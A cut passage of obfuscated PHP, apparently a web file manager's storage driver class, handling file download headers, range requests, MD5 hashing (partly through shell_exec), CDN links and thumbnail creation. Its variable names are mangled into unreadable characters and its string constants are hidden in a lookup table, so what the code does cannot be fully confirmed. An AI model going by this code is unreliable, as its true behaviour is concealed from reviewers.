strlen($‹ğ¾·°Ó)) == $‹ğ¾·°Ó) { $¡œˆ„‹[$‚î­ø¦¥[87]] = substr($¹ÙÉÌ¿[$‚î­ø¦¥[87]], strlen($‹ğ¾·°Ó)); } } $´½ÆŞä§ = $¹ÙÉÌ¿[$‚î­ø¦¥[78]] ? $‚î­ø¦¥[8] : $‚î­ø¦¥[12]; $¡œˆ„‹[$‚î­ø¦¥[89]] = rtrim($¡œˆ„‹[$‚î­ø¦¥[89]], $‚î­ø¦¥[8]) . $´½ÆŞä§; $¡œˆ„‹[$‚î­ø¦¥[87]] = $‚î­ø¦¥[8] . trim($¡œˆ„‹[$‚î­ø¦¥[87]], $‚î­ø¦¥[8]) . $´½ÆŞä§; if (!$Ù…À¥Ï) { $òñ¥¦íª = explode($‚î­ø¦¥[8], trim($¡œˆ„‹[$‚î­ø¦¥[87]], $‚î­ø¦¥[8])); $¡œˆ„‹[$‚î­ø¦¥[87]] = $‚î­ø¦¥[8] . implode($‚î­ø¦¥[8], array_slice($òñ¥¦íª, 1)) . $´½ÆŞä§; } $Ş‡ïö’Ñ[] = $¡œˆ„‹; } return array_sort_by($Ş‡ïö’Ñ, $‚î­ø¦¥[87]); } public function upload($Ò÷®–Ğ¤, $Òù¦©Ü¢, $™´Ëß©ô = false, $À¬¡‡† = REPEAT_REPLACE) { } public function uploadFileByID($ûåœ˜¿ú, $ò‘’©‹ù, $ûıì²µ) { } public function uploadFileByPath($Ã³³ş»—, $ÕšçşÈÓ, $›§•ì³ì = array()) { } public function isUploadServer() { $ÍÎ°ùâñ =& $_SERVER[”øäÃÍª]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÍÎ°ùâñ[91]) { return !0; } return $GLOBALS[$ÍÎ°ùâñ[6]][$ÍÎ°ùâñ[92]][$ÍÎ°ùâñ[93]]; } public function isFileOutServer() { $£æÇä¬Ê =& $_SERVER[”øäÃÍª]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $£æÇä¬Ê[91]) { return !0; } return $GLOBALS[$£æÇä¬Ê[6]][$£æÇä¬Ê[92]][$£æÇä¬Ê[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¾á°Å») { $ö—éÍ˜ =& $_SERVER[”øäÃÍª]; if (!$this->isCdnHost()) { return $¾á°Å»; } return str_replace(trim(get_url_root($¾á°Å»), $ö—éÍ˜[8]), trim($this->cdnHost, $ö—éÍ˜[8]), $¾á°Å»); } public function uploadLink($Ö£È…ş˜, $êÜå©õ = 0) { $Ø¹ûÅÆè =& $_SERVER[”øäÃÍª]; if ($this->isUploadServer()) { return; } $êÖ™Å¤¤ = $this->getType(); if (!in_array($êÖ™Å¤¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ìÚÖˆÑ† = 1024 * 1024 * 10; $«üäçˆñ = (!$êÜå©õ ? 1 : ceil($êÜå©õ / pow(1024, 3))) * 3600 * 4; if ($êÜå©õ <= $ìÚÖˆÑ†) { $‰Ê¸ğ”ô = $this->uploadFormData($Ö£È…ş˜, $«üäçˆñ); } else { $‰Ê¸ğ”ô = $this->uploadMultiData($Ö£È…ş˜, $«üäçˆñ); } if ($‰Ê¸ğ”ô) { $‰Ê¸ğ”ô[$Ø¹ûÅÆè[95]] = $Ö£È…ş˜; $‰Ê¸ğ”ô[$Ø¹ûÅÆè[96]] = $êÖ™Å¤¤; } return $‰Ê¸ğ”ô; } public function uploadFormData($óˆ½£õõ, $ËàâÖµ‚ = 3600) { } public function uploadMultiData($–¶œµ», $ú„æÖ†… = 3600) { } public function multiUploadFormData($ğä«º£ş, $â€îç²Å = 3600) { return $this->uploadMultiData($ğä«º£ş, $â€îç²Å); } public function download($òÙªôËÈ, $çÔÃğÖè) { } public function ext($¢ì³äæ–) { return get_path_ext($¢ì³äæ–); } public function pathThis($Ùá÷Ñ×Ó) { $ø‡ÍãÂÉ =& $_SERVER[”øäÃÍª]; $Ùá÷Ñ×Ó = str_replace($ø‡ÍãÂÉ[97], $ø‡ÍãÂÉ[8], rtrim($Ùá÷Ñ×Ó, $ø‡ÍãÂÉ[8])); $£€½Àë = strrpos($Ùá÷Ñ×Ó, $ø‡ÍãÂÉ[8]); if ($£€½Àë === !1) { return $Ùá÷Ñ×Ó; } return substr($Ùá÷Ñ×Ó, $£€½Àë + 1); } public function pathFather($Ì©ììš) { $¬¬Æ·ÚÖ =& $_SERVER[”øäÃÍª]; $Ì©ììš = str_replace($¬¬Æ·ÚÖ[97], $¬¬Æ·ÚÖ[8], rtrim($Ì©ììš, $¬¬Æ·ÚÖ[8])); $îèŠò×Ù = strrpos($Ì©ììš, $¬¬Æ·ÚÖ[8]); if ($îèŠò×Ù === !1) { return $¬¬Æ·ÚÖ[12]; } return substr($Ì©ììš, 0, $îèŠò×Ù + 1); } public function hashSimple($³¯¦¤Æ—) { $²ñ›ßş =& $_SERVER[”øäÃÍª]; if (!$³¯¦¤Æ—) { return md5($²ñ›ßş[12]); } $ìò¬Ëô  = $this->size($³¯¦¤Æ—); $„ª¤Ì³” = 200; $ÕÖ€íü = 50; if ($ìò¬Ëô  <= $„ª¤Ì³” * $ÕÖ€íü) { return $this->hashMd5($³¯¦¤Æ—) . $ìò¬Ëô ; } $â½éİúÍ = intval($ìò¬Ëô  / $ÕÖ€íü); $£½‚¢Óœ = $²ñ›ßş[12]; for ($€¡âÕã  = 0; $€¡âÕã  < $ÕÖ€íü; $€¡âÕã ++) { $£½‚¢Óœ .= $this->fileSubstr($³¯¦¤Æ—, $â½éİúÍ * $€¡âÕã , $„ª¤Ì³”); } $£½‚¢Óœ .= $this->fileSubstr($³¯¦¤Æ—, $ìò¬Ëô  - $„ª¤Ì³”, $„ª¤Ì³”); return md5($£½‚¢Óœ) . $ìò¬Ëô ; } public static $md5Cache = array(); public function hashMd5($ıæşĞ©õ) { if (!$ıæşĞ©õ) { return md5($_SERVER[”øäÃÍª][12]); } $ıæşĞ©õ = $this->iconvSystem($ıæşĞ©õ); if (isset(self::$md5Cache[$ıæşĞ©õ])) { return self::$md5Cache[$ıæşĞ©õ]; } self::$md5Cache[$ıæşĞ©õ] = $this->hashMd5Shell($ıæşĞ©õ); if (!self::$md5Cache[$ıæşĞ©õ]) { self::$md5Cache[$ıæşĞ©õ] = @md5_file($ıæşĞ©õ); } return self::$md5Cache[$ıæşĞ©õ]; } private function hashMd5Shell($ß‘ê„†ä) { $„œœÑ‰Ë =& $_SERVER[”øäÃÍª]; if (!$ß‘ê„†ä) { return md5($„œœÑ‰Ë[12]); } if (!function_exists($„œœÑ‰Ë[98])) { return !1; } $İ¿êƒÎó = array($„œœÑ‰Ë[99], $„œœÑ‰Ë[100]); $¦èò¢ = Cache::get($„œœÑ‰Ë[101]); if (!$¦èò¢) { $”¬ëÒ» = BASIC_PATH . $„œœÑ‰Ë[102]; $ğ÷™Áğ = md5_file($”¬ëÒ»); $¦èò¢ = $„œœÑ‰Ë[103]; foreach ($İ¿êƒÎó as $¡äÆ»„Î) { $¸Ïª¿ğ… = shell_exec($¡äÆ»„Î . $„œœÑ‰Ë[53] . escapeShell($”¬ëÒ»)); if ($¸Ïª¿ğ… && substr(trim($¸Ïª¿ğ…), 0, 32) == $ğ÷™Áğ) { $¦èò¢ = $¡äÆ»„Î; break; } } Cache::set($„œœÑ‰Ë[101], $¦èò¢, 3600); } if ($¦èò¢ == $„œœÑ‰Ë[103]) { return !1; } $¸Ïª¿ğ… = shell_exec($¦èò¢ . $„œœÑ‰Ë[53] . escapeShell($ß‘ê„†ä)); $¸Ïª¿ğ… = str_replace($„œœÑ‰Ë[104], $„œœÑ‰Ë[12], $¸Ïª¿ğ…); return substr($¸Ïª¿ğ…, 0, 32); } public function link($åµîÔ¬•) { return $åµîÔ¬•; } public function fileOut($ÂŸö¬—, $ë ÍÏ™ = false, $µØ¼‘ú« = false, $¬’•”Ù¸ = '') { $ÑóòğÓ­ =& $_SERVER[”øäÃÍª]; $this->cacheMethod(null, null); if (!$ÂŸö¬— || !$this->exist($ÂŸö¬—)) { show_json(LNG($ÑóòğÓ­[105]), !1, $µØ¼‘ú«); } $ı¼­’é = $this->getType() == $ÑóòğÓ­[106]; $§‹Æ¦¡Ñ = $GLOBALS[$ÑóòğÓ­[6]][$ÑóòğÓ­[92]][$ÑóòğÓ­[107]][$ÑóòğÓ­[108]]; $³íã‘ù = (double) $GLOBALS[$ÑóòğÓ­[6]][$ÑóòğÓ­[92]][$ÑóòğÓ­[107]][$ÑóòğÓ­[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÙéÒ®¦¯ = $this->infoFull($ÂŸö¬—); $¥¨çê«Ì = $ÙéÒ®¦¯[$ÑóòğÓ­[79]]; $¾øÆª¹Ê = gmdate($ÑóòğÓ­[110], $ÙéÒ®¦¯[$ÑóòğÓ­[88]]); $Å²ğâŸñ = $µØ¼‘ú« ? $µØ¼‘ú« : $this->iconvApp($ÙéÒ®¦¯[$ÑóòğÓ­[32]]); $œŒ¶è‚ = 0; $ìÖ»Òº = $¥¨çê«Ì - 1; $Ôªèõ€´ = $this->ext($Å²ğâŸñ); if (in_array($Ôªèõ€´, array($ÑóòğÓ­[111], $ÑóòğÓ­[112], $ÑóòğÓ­[113], $ÑóòğÓ­[114]))) { $Ôªèõ€´ = $ÑóòğÓ­[115]; } if (in_array($Ôªèõ€´, array($ÑóòğÓ­[116]))) { $Ôªèõ€´ = $ÑóòğÓ­[117]; } if (!$¬’•”Ù¸) { $¬’•”Ù¸ = md5($¾øÆª¹Ê . $¥¨çê«Ì); } $¬’•”Ù¸ = $ÑóòğÓ­[118] . $¬’•”Ù¸ . $ÑóòğÓ­[118]; $’¢‘¤² = get_file_mime($Ôªèõ€´); $‡Ó«‚Ü = !0; $‡Ó«‚Ü = isset($_GET[$ÑóòğÓ­[119]]) ? !1 : !0; if ($ë ÍÏ™ === !1 && !mime_support($’¢‘¤²)) { $’¢‘¤² = $ÑóòğÓ­[120]; } header($ÑóòğÓ­[121]); header($ÑóòğÓ­[122] . $’¢‘¤²); $éø¸äÊ¼ = rawurlencode($Å²ğâŸñ); $éø¸äÊ¼ = $ÑóòğÓ­[118] . $éø¸äÊ¼ . $ÑóòğÓ­[123] . $éø¸äÊ¼; if ($ë ÍÏ™) { header($ÑóòğÓ­[124]); header($ÑóòğÓ­[125] . $éø¸äÊ¼); } else { if ($‡Ó«‚Ü) { header($ÑóòğÓ­[126] . $éø¸äÊ¼); } } $ãü”å› = 3600 * 24 * 30; header($ÑóòğÓ­[127]); header($ÑóòğÓ­[128]); header($ÑóòğÓ­[129] . $ãü”å›); header($ÑóòğÓ­[130] . gmdate($ÑóòğÓ­[110], time() + $ãü”å›) . $ÑóòğÓ­[131]); if (isset($_SERVER[$ÑóòğÓ­[132]]) && strtotime($_SERVER[$ÑóòğÓ­[132]]) == $ÙéÒ®¦¯[$ÑóòğÓ­[88]]) { header($ÑóòğÓ­[133], !0, 304); die; } if (isset($_SERVER[$ÑóòğÓ­[134]]) && $_SERVER[$ÑóòğÓ­[134]] == $¬’•”Ù¸) { header($ÑóòğÓ­[135] . $¬’•”Ù¸, !0, 304); die; } header($ÑóòğÓ­[135] . $¬’•”Ù¸); header($ÑóòğÓ­[136] . $¾øÆª¹Ê . $ÑóòğÓ­[131]); header($ÑóòğÓ­[137] . rawurlencode($Å²ğâŸñ)); header($ÑóòğÓ­[138]); header($ÑóòğÓ­[139] . $¥¨çê«Ì); header($ÑóòğÓ­[140]); Hook::trigger($ÑóòğÓ­[141], $ÂŸö¬—, $¥¨çê«Ì, $Å²ğâŸñ, $Ôªèõ€´); if (!$ë ÍÏ™ && $Ôªèõ€´ == $ÑóòğÓ­[142]) { if ($¥¨çê«Ì > 1024 * 1024 * 10) { die; } $ªÕÚ’Æ« = $this->getContent($ÂŸö¬—); $ªÕÚ’Æ« = Html::clearSVG($ªÕÚ’Æ«); header($ÑóòğÓ­[143] . strlen($ªÕÚ’Æ«)); echo $ªÕÚ’Æ«; die; } $˜¨ÚÏíÓ = strtolower($_SERVER[$ÑóòğÓ­[144]]); if ($ı¼­’é && $˜¨ÚÏíÓ && $§‹Æ¦¡Ñ) { if (strstr($˜¨ÚÏíÓ, $ÑóòğÓ­[145])) { header($ÑóòğÓ­[146] . $ÂŸö¬—); } else { if (strstr($˜¨ÚÏíÓ, $ÑóòğÓ­[147])) { header($ÑóòğÓ­[148] . $ÂŸö¬—); } else { if (strstr($˜¨ÚÏíÓ, $ÑóòğÓ­[149])) { header($ÑóòğÓ­[150] . $ÂŸö¬—); } } } if ($³íã‘ù) { header($ÑóòğÓ­[151] . $³íã‘ù); } return; } if (isset($_SERVER[$ÑóòğÓ­[152]])) { if (preg_match($ÑóòğÓ­[153], $_SERVER[$ÑóòğÓ­[152]], $Å´ˆÜÇå)) { $œŒ¶è‚ = intval($Å´ˆÜÇå[1]); $œŒ¶è‚ = $œŒ¶è‚ <= 0 ? 0 : ($œŒ¶è‚ >= $ìÖ»Òº ? $ìÖ»Òº : $œŒ¶è‚); if (!empty($Å´ˆÜÇå[2])) { $÷¬“™ù = intval($Å´ˆÜÇå[2]); $ìÖ»Òº = $÷¬“™ù < $œŒ¶è‚ ? $œŒ¶è‚ : ($÷¬“™ù >= $ìÖ»Òº ? $ìÖ»Òº : $÷¬“™ù); } } header($ÑóòğÓ­[154]); header("\x43\157\x6e\x74\145\x6e\164\x2d\x52\141\156\x67\145\72\x20\142\x79\164\145\x73\40{$œŒ¶è‚}\55{$ìÖ»Òº}\57" . $¥¨çê«Ì); } else { header($ÑóòğÓ­[155]); } header($ÑóòğÓ­[156]); header($ÑóòğÓ­[157]); $Ó’¢¦âš = !0; if ($_SERVER[$ÑóòğÓ­[158]] == $ÑóòğÓ­[159] && $¥¨çê«Ì > 1204 * 1024 * 1024 * 2) { $Ó’¢¦âš = !1; } if ($Ó’¢¦âš) { header($ÑóòğÓ­[160] . ($ìÖ»Òº - $œŒ¶è‚ + 1)); } if ($_SERVER[$ÑóòğÓ­[161]] == $ÑóòğÓ­[162]) { return; } $’Ş¾Â¤´ = array($ÑóòğÓ­[163] => !1, $ÑóòğÓ­[164] => $œŒ¶è‚, $ÑóòğÓ­[165] => $ìÖ»Òº, $ÑóòğÓ­[166] => $Ôªèõ€´, $ÑóòğÓ­[167] => $ÙéÒ®¦¯, $ÑóòğÓ­[168] => $ÑóòğÓ­[12], $ÑóòğÓ­[169] => 0); $’Ş¾Â¤´ = Hook::filter($ÑóòğÓ­[170], $’Ş¾Â¤´); $­Ç¯ßŞ = 1024 * 300; $Üİ“¯ô€ = 0; if ($³íã‘ù) { $Üİ“¯ô€ = intval(1000 * 1000 * ($­Ç¯ßŞ / $³íã‘ù)); } while ($œŒ¶è‚ <= $ìÖ»Òº) { $Å·”«“ = timeFloat(); check_abort(); $Õî¿™ïƒ = $ìÖ»Òº - $œŒ¶è‚ + 1; if ($Õî¿™ïƒ <= $­Ç¯ßŞ) { $­Ç¯ßŞ = $Õî¿™ïƒ; } $ªÕÚ’Æ« = $this->fileSubstr($ÂŸö¬—, $œŒ¶è‚, $­Ç¯ßŞ); if ($’Ş¾Â¤´[$ÑóòğÓ­[163]]) { $’Ş¾Â¤´[$ÑóòğÓ­[168]] = $ªÕÚ’Æ«; $’Ş¾Â¤´[$ÑóòğÓ­[169]] = $œŒ¶è‚; $’Ş¾Â¤´ = Hook::filter($ÑóòğÓ­[171], $’Ş¾Â¤´); $ªÕÚ’Æ« = $’Ş¾Â¤´[$ÑóòğÓ­[168]]; } echo $ªÕÚ’Æ«; $œŒ¶è‚ += $­Ç¯ßŞ; if ($­Ç¯ßŞ == $Õî¿™ïƒ) { $œŒ¶è‚ = $ìÖ»Òº + 1; } if ($Üİ“¯ô€) { $†¯¢®Éœ = intval(1000 * 1000 * (timeFloat() - $Å·”«“)); $¾Úíá©¸ = $Üİ“¯ô€ - $†¯¢®Éœ; if ($¾Úíá©¸ > 5) { usleep($¾Úíá©¸); } } } } public function fileOutServer($üÎÒ«ó, $ª–É—’È = false, $ğÆß—¸ù = false, $ú¦ø†Ü = '') { $this->fileOut($üÎÒ«ó, $ª–É—’È, $ğÆß—¸ù, $ú¦ø†Ü); } public function fileOutLink($ÇÔ÷Ç¬±) { header($_SERVER[”øäÃÍª][172] . $ÇÔ÷Ç¬±); die; } public function cacheMethod($ˆãêÄã£, $€ÓÖ¢õ¨, $Õ‰Ç«ÁÅ = null) { $Ø¢ü™‹¥ =& $_SERVER[”øäÃÍª]; static $ùÒú¥åÓ = array(); $—¥ß–‚§ = $€ÓÖ¢õ¨ ? ltrim($this->getPathOuter($€ÓÖ¢õ¨), $Ø¢ü™‹¥[8]) : $Ø¢ü™‹¥[12]; $†ğïÔõ = $Ø¢ü™‹¥[173] . $ˆãêÄã£ . $Ø¢ü™‹¥[174] . rtrim($—¥ß–‚§, $Ø¢ü™‹¥[8]); if (is_null($ˆãêÄã£)) { $ùÒú¥åÓ = array(); return; } if (is_null($€ÓÖ¢õ¨)) { foreach ($ùÒú¥åÓ as $†ğïÔõ => $ÓáÑ¿©§) { if (!strstr($†ğïÔõ, $Ø¢ü™‹¥[173] . $ˆãêÄã£ . $Ø¢ü™‹¥[175])) { continue; } unset($ùÒú¥åÓ[$†ğïÔõ]); } return; } if ($Õ‰Ç«ÁÅ === $Ø¢ü™‹¥[176]) { unset($ùÒú¥åÓ[$†ğïÔõ]); return; } if (!is_null($Õ‰Ç«ÁÅ)) { $ùÒú¥åÓ[$†ğïÔõ] = $Õ‰Ç«ÁÅ; return; } $Í¹¯•İñ = isset($ùÒú¥åÓ[$†ğïÔõ]) ? $ùÒú¥åÓ[$†ğïÔõ] : null; if (!is_null($Í¹¯•İñ)) { return $Í¹¯•İñ; } $Í¹¯•İñ = $this->{$ˆãêÄã£}($€ÓÖ¢õ¨); $ùÒú¥åÓ[$†ğïÔõ] = $Í¹¯•İñ; return $Í¹¯•İñ; } public function cacheMethodInfoSet($×è”•ê, $•÷ˆºª‰, $Ã© á½Õ = false) { $ˆ¥áä÷ =& $_SERVER[”øäÃÍª]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ˆ¥áä÷[177], $×è”•ê, $•÷ˆºª‰); $this->cacheMethod($ˆ¥áä÷[178], $×è”•ê, $•÷ˆºª‰ ? !1 : !0); if (is_array($Ã© á½Õ)) { $this->cacheMethod($ˆ¥áä÷[179], $×è”•ê, $Ã© á½Õ); } } public function fileOutImage($¾¯ùİ£, $Œ²†şÊ = 250) { $”¼ÜÒ¿Œ =& $_SERVER[”øäÃÍª]; set_timeout(); if (substr($¾¯ùİ£, 0, 4) == $”¼ÜÒ¿Œ[149]) { $this->fileOutLink($¾¯ùİ£); } $˜½Ë±–¼ = $this->info($¾¯ùİ£); $öœ·¶¤Á = !1; $é°±ñª = isset($GLOBALS[$”¼ÜÒ¿Œ[180]]) ? $GLOBALS[$”¼ÜÒ¿Œ[180]] : array(); if ($é°±ñª && $é°±ñª[$”¼ÜÒ¿Œ[181]] == $˜½Ë±–¼[$”¼ÜÒ¿Œ[87]]) { $˜½Ë±–¼ = $é°±ñª; $ìÚ¹ØËˆ = $˜½Ë±–¼[$”¼ÜÒ¿Œ[182]]; if ($ìÚ¹ØËˆ && isset($ìÚ¹ØËˆ[$”¼ÜÒ¿Œ[183]])) { if ($ìÚ¹ØËˆ[$”¼ÜÒ¿Œ[183]] <= $Œ²†şÊ && $ìÚ¹ØËˆ[$”¼ÜÒ¿Œ[184]] <= $Œ²†şÊ) { $öœ·¶¤Á = !0; } } } if ($˜½Ë±–¼[$”¼ÜÒ¿Œ[79]] <= 1024 * 50 || $öœ·¶¤Á || !function_exists($”¼ÜÒ¿Œ[185]) || $˜½Ë±–¼[$”¼ÜÒ¿Œ[166]] == $”¼ÜÒ¿Œ[186]) { return $this->fileOut($¾¯ùİ£, !1, $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]]); } $ºÆãÕºĞ = kodIO::hashPath($˜½Ë±–¼); $ê˜ñ¼º = "\x63\157\x76\145\162\x5f{$ºÆãÕºĞ}\137{$Œ²†şÊ}\56\160\156\147"; $¯Ú§’ÊÌ = IO_PATH_SYSTEM_TEMP . $”¼ÜÒ¿Œ[187]; $öÆ’”õò = IO::infoFullSimple($¯Ú§’ÊÌ); $‹Œà†ºÀ = $öÆ’”õò && is_array($öÆ’”õò) ? $öÆ’”õò[$”¼ÜÒ¿Œ[87]] : $”¼ÜÒ¿Œ[12]; if (!$‹Œà†ºÀ) { $‹Œà†ºÀ = IO::mkdir($¯Ú§’ÊÌ); } if ($˜½Ë±–¼[$”¼ÜÒ¿Œ[188]] == $”¼ÜÒ¿Œ[189] && isset($˜½Ë±–¼[$”¼ÜÒ¿Œ[190]]) && $˜½Ë±–¼[$”¼ÜÒ¿Œ[190]] == kodIO::sourceID($‹Œà†ºÀ)) { $Ò‡­Á = $˜½Ë±–¼[$”¼ÜÒ¿Œ[191]]; if ($Œ²†şÊ <= 500) { $ĞÌÃÜ¨¿ = preg_replace($”¼ÜÒ¿Œ[192], $”¼ÜÒ¿Œ[193], $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]]); $Ò‡­Á = IO::fileNameExist($‹Œà†ºÀ, $ĞÌÃÜ¨¿); } return IO::fileOut(KodIO::make($Ò‡­Á), !1, $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]]); } $ç¥©Ÿê¹ = IO::fileNameExist($‹Œà†ºÀ, $ê˜ñ¼º); if ($ç¥©Ÿê¹) { return IO::fileOut(KodIO::make($ç¥©Ÿê¹), !1, $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]]); } if ($Œ²†şÊ > 1000) { $this->makeImageCover($‹Œà†ºÀ, $¾¯ùİ£, $ê˜ñ¼º, $Œ²†şÊ); $this->makeImageCover($‹Œà†ºÀ, $¾¯ùİ£, "\x63\x6f\x76\145\x72\x5f{$ºÆãÕºĞ}\x5f\62\x35\60\x2e\160\x6e\147", 250); $ç¥©Ÿê¹ = IO::fileNameExist($‹Œà†ºÀ, $ê˜ñ¼º); if ($ç¥©Ÿê¹) { return IO::fileOut(KodIO::make($ç¥©Ÿê¹), !1, $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]]); } die; } if (!kodIO::allowCover($˜½Ë±–¼)) { return $this->fileOut($¾¯ùİ£, !1, $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]]); } $—·¬£İ¿ = Cache::get($ê˜ñ¼º); if ($—·¬£İ¿ == $”¼ÜÒ¿Œ[194] || $—·¬£İ¿ == $”¼ÜÒ¿Œ[195]) { echo $—·¬£İ¿; die; } Cache::set($ê˜ñ¼º, $”¼ÜÒ¿Œ[195], 60); $øêÂÍ‚Æ = array($‹Œà†ºÀ, $˜½Ë±–¼[$”¼ÜÒ¿Œ[87]], $ê˜ñ¼º, $Œ²†şÊ); $­ÂÎ¾—€ = $”¼ÜÒ¿Œ[196] . $˜½Ë±–¼[$”¼ÜÒ¿Œ[79]] . $”¼ÜÒ¿Œ[197] . $ê˜ñ¼º . $”¼ÜÒ¿Œ[198] . $˜½Ë±–¼[$”¼ÜÒ¿Œ[32]] . $”¼ÜÒ¿Œ[199] . $˜½Ë±–¼[$”¼ÜÒ¿Œ[87]]; TaskQueue::add($”¼ÜÒ¿Œ[200], $øêÂÍ‚Æ, $­ÂÎ¾—€, $ê˜ñ¼º); } public function makeImageCover($×¿Û‡©‹, $­Å–½‘°, $×¾€Ñ—ü, $¢Õ‚•ú) { $­€—„–â =& $_SERVER[”øäÃÍª]; if (IO::fileNameExist($×¿Û‡©‹, $×¾€Ñ—ü)) { return $­€—„–â[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $«œ¾ÏŸğ = $this->getPathOuter($­Å–½‘°); $…´ê…µÀ = DATA_THUMB . $×¾€Ñ—ü; del_file($…´ê…µÀ); $ êâ´ = IO::copy($«œ¾ÏŸğ, TEMP_FILES, !1, $×¾€Ñ—ü); if (!@file_exists($ êâ´)) { return $­€—„–â[202]; } ImageThumb::createThumb($ êâ´, $…´ê…µÀ, $¢Õ‚•ú, $¢Õ‚•ú * 10); if (@file_exists($…´ê…µÀ)) { Cache::remove($×¾€Ñ—ü); return IO::move($…´ê…µÀ, $×¿Û‡©‹); } Cache::set($×¾€Ñ—ü, $­€—„–â[194], 600); del_file($…´ê…µÀ); return $­€—„–â[203] . $ êâ´ . $­€—„–â[74]; } public function fileOutImageServer($°¢êäÚè, $°ó´äÒõ = 250) { $this->fileOutImage($°¢êäÚè, $°ó´äÒõ); } public function fileNameAuto($™îªØÍ®, $çÀõÏ‰, $¿Ü¤Š²± = REPEAT_RENAME, $¼ÎÑŞ‰› = false) { $ƒöğüáê =& $_SERVER[”øäÃÍª]; $ş¤ùœ¨ = $™îªØÍ® === $ƒöğüáê[12] ? $çÀõÏ‰ : rtrim($™îªØÍ®, $ƒöğüáê[8]) . $ƒöğüáê[8] . $çÀõÏ‰; if ($¿Ü¤Š²± == REPEAT_REPLACE || !$this->exist($ş¤ùœ¨) || $¼ÎÑŞ‰› && $¿Ü¤Š²± != REPEAT_RENAME_FOLDER) { return $çÀõÏ‰; } if ($¿Ü¤Š²± == REPEAT_SKIP) { return !1; } $˜ÃÙÉËÑ = $ƒöğüáê[10] . get_path_ext($çÀõÏ‰); $˜ÃÙÉËÑ = $˜ÃÙÉËÑ == $ƒöğüáê[10] || $¼ÎÑŞ‰› ? $ƒöğüáê[12] : $˜ÃÙÉËÑ; $Ê’æÆû = 1; $Ùë…¡®ª = substr($çÀõÏ‰, 0, strlen($çÀõÏ‰) - strlen($˜ÃÙÉËÑ)); $²ÂÛÓÃ = $Ùë…¡®ª . "\x28{$Ê’æÆû}\x29{$˜ÃÙÉËÑ}"; while ($this->exist(rtrim($™îªØÍ®, $ƒöğüáê[8]) . $ƒöğüáê[8] . $²ÂÛÓÃ)) { $²ÂÛÓÃ = $Ùë…¡®ª . "\50{$Ê’æÆû}\51{$˜ÃÙÉËÑ}"; $Ê’æÆû++; } return $²ÂÛÓÃ; } private function fileNameAutoList($Ë¤’êÆ´, $˜Ô‘—İ, $îªÀ·ä„ = false) { $÷ÒÓ˜´ê =& $_SERVER[”øäÃÍª]; $í×–¿µÎ = $this->listPath($Ë¤’êÆ´, !0); $í×–¿µÎ = array_merge($í×–¿µÎ[$÷ÒÓ˜´ê[85]], $í×–¿µÎ[$÷ÒÓ˜´ê[86]]); $†œëŒ®¹ = array_to_keyvalue($í×–¿µÎ, $÷ÒÓ˜´ê[12], $÷ÒÓ˜´ê[32]); $ôœ„¹«š = $÷ÒÓ˜´ê[10] . get_path_ext($˜Ô‘—İ); $ôœ„¹«š = $ôœ„¹«š == $÷ÒÓ˜´ê[10] || $îªÀ·ä„ ? $÷ÒÓ˜´ê[12] : $ôœ„¹«š; $±¿ÊŒ« = substr($˜Ô‘—İ, 0, strlen($˜Ô‘—İ) - strlen($ôœ„¹«š)); $ º¿Ğà = $±¿ÊŒ« . "\50\x30\51{$ôœ„¹«š}"; for ($–ğ†ô ± = 1; $–ğ†ô ± <= count($†œëŒ®¹) + 1; $–ğ†ô ±++) { $ º¿Ğà = $±¿ÊŒ« . "\x28{$–ğ†ô ±}\x29{$ôœ„¹«š}"; if (!in_array_not_case($ º¿Ğà, $†œëŒ®¹)) { return $ º¿Ğà; } } return $ º¿Ğà; } public function listAllFiles($»£àï, $â¯Ã») { $ğæÃ¡…  =& $_SERVER[”øäÃÍª]; if (empty($â¯Ã»)) { return array(); } $ı™ıÄ°ï = array_keys($â¯Ã»); $ŠÆ›ŒÄê = array(); $»£àï = trim($»£àï, $ğæÃ¡… [8]); foreach ($â¯Ã» as $‰…Õüõ® => $öÔ•êÏÇ) { $á›ÄÈéË = ltrim(substr(trim($‰…Õüõ®, $ğæÃ¡… [8]), strlen($»£àï)), $ğæÃ¡… [8]); if (substr($‰…Õüõ®, -1) == $ğæÃ¡… [8]) { $á›ÄÈéË = rtrim($á›ÄÈéË, $ğæÃ¡… [8]) . $ğæÃ¡… [8]; } $ŠÆ›ŒÄê = array_merge($ŠÆ›ŒÄê, $this->slicePath($á›ÄÈéË)); } $à³ÀèÅ• = array(); foreach (array_unique($ŠÆ›ŒÄê) as $¼ßºñ³) { $Å¡úÈ×¶ = array($ğæÃ¡… [87] => $this->getPathOuter($ğæÃ¡… [8] . $»£àï . $ğæÃ¡… [8] . $¼ßºñ³), $ğæÃ¡… [78] => 1, $ğæÃ¡… [79] => 0); if (substr($¼ßºñ³, -1) != $ğæÃ¡… [8]) { $Å¡úÈ×¶[$ğæÃ¡… [78]] = 0; $„Â¯ÈŒ€ = $this->getPath($»£àï . $ğæÃ¡… [8] . $¼ßºñ³); if (isset($â¯Ã»[$„Â¯ÈŒ€])) { $Ø Çäø˜ = $â¯Ã»[$„Â¯ÈŒ€]; if (isset($Ø Çäø˜[$ğæÃ¡… [79]])) { $Å¡úÈ×¶[$ğæÃ¡… [79]] = intval($Ø Çäø˜[$ğæÃ¡… [79]]); } if (isset($Ø Çäø˜[$ğæÃ¡… [204]])) { $Å¡úÈ×¶[$ğæÃ¡… [88]] = intval($Ø Çäø˜[$ğæÃ¡… [204]]); } } } $à³ÀèÅ•[] = $Å¡úÈ×¶; } return $à³ÀèÅ•; } public function slicePath($ÇÔè¤ˆâ) { $ìåà»¡ =& $_SERVER[”øäÃÍª]; $¤Ôò˜àÍ = explode($ìåà»¡[8], trim($ÇÔè¤ˆâ, $ìåà»¡[8])); $‘İÇîò = 0; do { ++$‘İÇîò; $±îÈã£Ñ[] = implode($ìåà»¡[8], 